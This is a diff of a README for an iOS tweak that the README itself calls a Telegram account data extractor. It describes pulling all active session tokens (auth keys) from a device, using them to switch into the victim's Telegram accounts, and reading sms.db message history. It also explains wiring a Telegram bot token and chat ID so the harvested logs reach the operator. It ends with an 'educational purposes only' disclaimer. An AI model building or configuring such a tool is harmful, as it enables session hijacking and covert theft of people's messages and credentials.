@@ -8,7 +8,7 @@ This project is a Telegram account data extractor, with additional capabilities 
 
 🔹 It extracts all active session tokens (auth keys) from the device.
 
-⸻
+
 
 ⚙️ Building Guide (After Creating Your .dylib)
 
@@ -33,7 +33,7 @@ To build and package the final version:
 	•	Device details
 	•	iOS version
 
-⸻
+
 
 📁 How to Access the atomic-state File?
 	
@@ -54,19 +54,19 @@ AppGroups/telegram-data/accounts-metadata/
 
 This process allows you to switch Telegram accounts using session data.
 
-⸻
+
 
 📨 What About sms.db?
 
 This file may contain message history. You can open and inspect it with Filza or SQLManager.
 
-⸻
+
 
 🛠️ Building from Source
 
 If you want to build the project from source, you can use Theos — visit theos.dev for installation and usage instructions.
 
-⸻
+
 
 🤖 How to Set Up Telegram Bot for Receiving Logs
 
@@ -82,7 +82,7 @@ NSString *const kChatID = @"YOUR_CHAT_ID_HERE";     // Use @getmyid_bot or Swift
 
 4.	Don’t forget to start the bot by sending /start.
 
-⸻
+
 
 ⚠️ This tool is intended for educational and research purposes only. Use responsibly and within legal boundaries.
 
